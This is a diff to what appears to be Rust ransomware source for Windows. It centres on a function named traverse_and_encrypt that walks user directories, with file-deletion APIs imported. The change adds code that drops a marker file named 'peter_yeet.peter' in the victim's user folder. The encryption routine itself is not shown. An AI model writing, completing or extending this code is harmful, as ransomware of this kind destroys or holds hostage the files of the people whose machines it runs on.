@@ -6,10 +6,10 @@ use std::ffi::CString;
 use std::ptr::null_mut;
 use std::str;
 use winapi::shared::minwindef::FILETIME;
+use winapi::um::fileapi::{CreateFileA, OPEN_ALWAYS};
 use winapi::um::fileapi::{DeleteFileA, FindFirstFileA, FindNextFileA};
 use winapi::um::handleapi::INVALID_HANDLE_VALUE;
 use winapi::um::minwinbase::WIN32_FIND_DATAA;
-
 use winapi::um::winbase::GetUserNameA;
 use winapi::um::winnt::{FILE_ATTRIBUTE_DIRECTORY, HANDLE};
 // traverse_and_encrypt will populate this vector
@@ -70,6 +70,22 @@ pub fn traverse_and_encrypt() {
             let full_path: CString = CString::new(full_path.as_bytes()).unwrap();
             traverse(full_path);
         }
+
+        let mut full_path = String::from("C:\\Users\\");
+        full_path.push_str(str::from_utf8(&user_name[..]).unwrap());
+        full_path.push_str("\\peter_yeet.peter");
+
+        let full_path: CString = CString::new(full_path).unwrap();
+
+        CreateFileA(
+            full_path.as_ptr(),
+            1,
+            1,
+            null_mut(),
+            OPEN_ALWAYS,
+            0x80,
+            null_mut(),
+        );
     }
 }
 
